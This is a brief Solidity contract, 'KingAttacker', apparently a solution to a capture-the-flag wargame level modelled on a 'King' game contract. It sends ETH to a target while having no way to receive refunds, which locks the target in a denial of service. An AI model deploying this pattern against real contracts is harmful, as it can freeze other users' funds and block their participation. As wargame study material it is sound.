// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

contract KingAttacker {
    function execute(address payable target) external payable {
        require(target != address(0), 'bad target');
        require(msg.value > 0, 'need eth');
        require(_sendEth(target, msg.value), 'send fail');
    }

    function _sendEth(address payable to, uint256 amount)
        internal
        returns (bool sent)
    {
        // solhint-disable avoid-low-level-calls
        (sent, ) = to.call{ value: amount }('');
    }
}
